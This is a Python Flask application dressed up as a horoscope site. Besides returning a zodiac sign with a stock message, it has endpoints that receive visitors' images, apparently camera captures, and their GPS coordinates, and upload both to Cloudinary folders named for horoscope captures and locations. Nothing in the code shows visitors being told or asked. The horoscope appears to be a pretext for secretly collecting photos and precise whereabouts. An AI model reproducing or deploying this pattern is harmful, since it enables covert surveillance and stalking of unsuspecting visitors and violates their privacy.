from flask import Flask, render_template, request, jsonify
import base64, os, time, csv
from datetime import datetime
import cloudinary
import cloudinary.uploader

app = Flask(__name__)

# Configure Cloudinary
cloudinary.config(
    cloud_name=os.environ.get("CLOUDINARY_CLOUD_NAME"),
    api_key=os.environ.get("CLOUDINARY_API_KEY"),
    api_secret=os.environ.get("CLOUDINARY_API_SECRET")
)

LOC_FILE = "captures/locations.csv"
os.makedirs("captures", exist_ok=True)

if not os.path.exists(LOC_FILE):
    with open(LOC_FILE, "w", newline="") as f:
        csv.writer(f).writerow(["timestamp", "lat", "lon", "accuracy"])

ZODIAC_DATA = {
    "Capricorn": "♑", "Aquarius": "♒", "Pisces": "♓",
    "Aries": "♈", "Taurus": "♉", "Gemini": "♊",
    "Cancer": "♋", "Leo": "♌", "Virgo": "♍",
    "Libra": "♎", "Scorpio": "♏", "Sagittarius": "♐"
}

def zodiac(month, day):
    signs = [
        ("Capricorn",(12,22),(1,19)), ("Aquarius",(1,20),(2,18)),
        ("Pisces",(2,19),(3,20)), ("Aries",(3,21),(4,19)),
        ("Taurus",(4,20),(5,20)), ("Gemini",(5,21),(6,20)),
        ("Cancer",(6,21),(7,22)), ("Leo",(7,23),(8,22)),
        ("Virgo",(8,23),(9,22)), ("Libra",(9,23),(10,22)),
        ("Scorpio",(10,23),(11,21)), ("Sagittarius",(11,22),(12,21))
    ]
    for s, start, end in signs:
        if (month == start[0] and day >= start[1]) or \
           (month == end[0] and day <= end[1]):
            return s
    return "Capricorn"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/horoscope", methods=["POST"])
def horoscope():
    data = request.json
    dob = data["dob"]
    name = data["name"]
    city = data["city"]

    m, d = map(int, dob.split("-")[1:])
    sign = zodiac(m, d)

    return jsonify({
        "name": name,
        "city": city,
        "sign": sign,
        "icon": ZODIAC_DATA.get(sign, "✨"),
        "message": "A calm but powerful shift works in your favor today."
    })

@app.route("/capture", methods=["POST"])
def capture():
    try:
        # Upload image directly to Cloudinary
        img_data = request.json["image"]
        
        result = cloudinary.uploader.upload(
            img_data,
            folder="horoscope_captures",
            public_id=f"capture_{int(time.time())}",
            resource_type="image"
        )
        
        return jsonify({
            "saved": True,
            "url": result["secure_url"],
            "public_id": result["public_id"]
        })
    except Exception as e:
        return jsonify({"saved": False, "error": str(e)}), 500

@app.route("/location", methods=["POST"])
def location():
    d = request.json
    
    # Create location data with timestamp
    location_data = {
        "timestamp": datetime.utcnow().isoformat(),
        "lat": d["lat"],
        "lon": d["lon"],
        "accuracy": d["accuracy"]
    }
    
    try:
        # Upload as a JSON file to Cloudinary
        import json
        result = cloudinary.uploader.upload(
            f"data:text/plain;base64,{base64.b64encode(json.dumps(location_data).encode()).decode()}",
            folder="horoscope_locations",
            public_id=f"location_{int(time.time())}",
            resource_type="raw"
        )
        return jsonify({"logged": True, "url": result["secure_url"]})
    except Exception as e:
        return jsonify({"logged": False, "error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)